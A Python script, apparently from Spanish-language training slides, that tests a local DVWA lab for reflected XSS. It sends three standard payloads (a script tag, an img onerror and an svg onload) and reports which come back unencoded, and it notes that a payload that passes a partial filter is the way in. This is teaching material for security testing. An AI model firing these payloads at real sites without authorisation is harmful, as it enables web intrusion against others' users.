# Diapositiva 203: Prueba 2 - Deteccion de XSS reflejado (parte 2, completa)
# Muestra la prueba de XSS completa: por cada payload imprime
# [VULNERABLE] si se refleja sin codificar, o [OK] si no.

import requests  # libreria para enviar peticiones HTTP

# Estas dos lineas vienen de la diapositiva 199 (sesion ya autenticada en DVWA).
BASE_URL = "http://127.0.0.1/dvwa"   # direccion base del laboratorio
sesion = requests.Session()           # sesion que ya tendria la cookie de login

XSS_URL = f"{BASE_URL}/vulnerabilities/xss_r/"   # URL del modulo de XSS reflejado
payloads_xss = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>"]   # distintos vectores de prueba
print("[*] Iniciando prueba de XSS reflejado...")
for payload in payloads_xss:           # recorremos cada payload
    respuesta = sesion.get(XSS_URL, params={"name": payload})  # lo enviamos en el parametro 'name'
    if payload in respuesta.text:      # si aparece literal (sin codificar) en la respuesta
        print(f"  [VULNERABLE] XSS reflejado con: {payload!r}")
    else:                              # si no se reflejo tal cual
        print(f"  [OK]         Payload no reflejado: {payload!r}")
# Que unos pasen y otros no revela un filtro parcial: el vector que pasa es el camino.
